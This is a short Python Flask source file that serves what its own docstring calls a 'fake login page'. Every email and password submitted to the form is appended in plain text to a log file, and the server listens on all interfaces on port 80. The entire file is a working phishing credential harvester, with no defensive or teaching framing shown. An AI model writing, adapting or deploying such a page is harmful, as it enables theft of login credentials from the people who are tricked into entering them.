"""Runs simple login page. Requires root."""

from flask import Flask, render_template, request

app = Flask(__name__)
logfile = "logs/currentlog.log"


@app.route("/", methods=["POST", "GET"])
def login():
    """Fake login page."""
    if request.method == "POST":
        with open(logfile, 'a') as f:
            entry = request.form["email"] + ": " + request.form["password"]
            f.write(entry + '\n')

    return render_template('login.html')


if __name__ == "__main__":
    app.run('0.0.0.0', port=80)
